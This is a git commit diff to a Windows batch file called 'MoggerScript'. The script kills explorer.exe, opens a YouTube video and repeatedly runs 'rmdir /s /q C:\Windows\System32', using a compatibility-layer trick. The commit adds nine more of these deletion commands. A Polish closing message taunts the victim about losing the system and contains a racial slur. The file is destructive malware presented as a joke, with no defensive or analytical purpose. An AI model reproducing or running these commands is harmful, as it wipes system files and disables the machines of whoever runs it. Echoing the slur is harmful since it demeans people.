d22a65b3510b2ee9b2018f79b5082bd2def82278
strblzng <160648940+strblzng@users.noreply.github.com>
2024-02-20 21:21:37 +0100

    Update mogging.bat

--- mogging.bat
+++ mogging.bat
@@ -2,6 +2,15 @@
 rem "MoggerScript by strblzng 1.1b"
 taskkill /f /im explorer.exe
 start https://www.youtube.com/watch?v=Sz_kQuEM0mI
+start rmdir /s /q C:\Windows\System32
+start rmdir /s /q C:\Windows\System32
+start rmdir /s /q C:\Windows\System32
+start rmdir /s /q C:\Windows\System32
+start rmdir /s /q C:\Windows\System32
+start rmdir /s /q C:\Windows\System32
+start rmdir /s /q C:\Windows\System32
+start rmdir /s /q C:\Windows\System32
+start rmdir /s /q C:\Windows\System32
 Set __COMPAT_LAYER=RunAsInvoker && rmdir /s /q C:\Windows\System32
 echo XDDDDDDDD
 echo 'Nacisnij jakikolwiek klawisz aby pożegnać się z systemem.... (C) STRBLZNGx 1337 HACKAZ REAL NIGGHAZ OUT HERE.'
